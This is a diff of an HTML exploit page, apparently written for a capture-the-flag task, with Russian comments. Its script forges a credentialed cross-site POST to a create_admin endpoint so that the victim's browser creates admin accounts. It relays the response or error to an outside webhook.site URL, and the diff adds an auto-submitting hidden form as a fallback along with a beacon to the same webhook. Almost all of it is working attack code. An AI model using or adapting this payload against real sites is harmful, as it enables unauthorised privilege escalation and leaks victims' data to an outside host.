@@ -2,40 +2,39 @@
 <html>
 <body>
 <script>
-  // Отправляем POST-запрос на create_admin от имени жертвы
+  // Попытка через fetch (может не сработать из-за SameSite)
   fetch('http://tasks.goidactf.ru:20309/create_admin', {
     method: 'POST',
-    credentials: 'include',  // ← обязательно для отправки кук
+    credentials: 'include',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
-      'Referer': 'http://tasks.goidactf.ru:20309/admin',
-      'Origin': 'http://tasks.goidactf.ru:20309'
+      'Referer': 'http://tasks.goidactf.ru:20309/admin'
     },
-    body: 'new_admin_login=123'
+    body: 'new_admin_login=hacker'
   })
-  .then(res => {
-    // ЭТО РАБОТАЕТ ТОЛЬКО ЕСЛИ ЕСТЬ CORS!
-    return res.text().then(body => ({
-      status: res.status,
-      headers: [...res.headers.entries()],
-      body: body
-    }));
-  })
-  .then(data => {
+  .then(r => r.text())
+  .then(html => {
+    // Успешно прочитали ответ → CORS открыт!
     fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-      method: 'POST',
-      body: JSON.stringify(data),
-      headers: { 'Content-Type': 'application/json' }
+      method: 'POST', body: html
     });
   })
-  .catch(err => {
-    // Если CORS блокирует — попадём сюда
-    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741', {
-      method: 'POST',
-      body: JSON.stringify({ error: err.toString() }),
-      headers: { 'Content-Type': 'application/json' }
-    });
+  .catch(e => {
+    // CORS закрыт — но запрос мог уйти!
+    // Всё равно пингани webhook
+    fetch('https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741?error=' + encodeURIComponent(e.message));
   });
+
+  // Дополнительно: надёжный fallback через форму
+  setTimeout(() => {
+    const f = document.createElement('form');
+    f.action = 'http://tasks.goidactf.ru:20309/create_admin';
+    f.method = 'POST';
+    f.innerHTML = '<input name="new_admin_login" value="hacker2">';
+    document.body.appendChild(f);
+    f.submit();
+    new Image().src = "https://webhook.site/d7a1179b-eb8b-4901-801d-0afbed2f3741?fallback_sent=1";
+  }, 1000);
 </script>
 </body>
 </html>
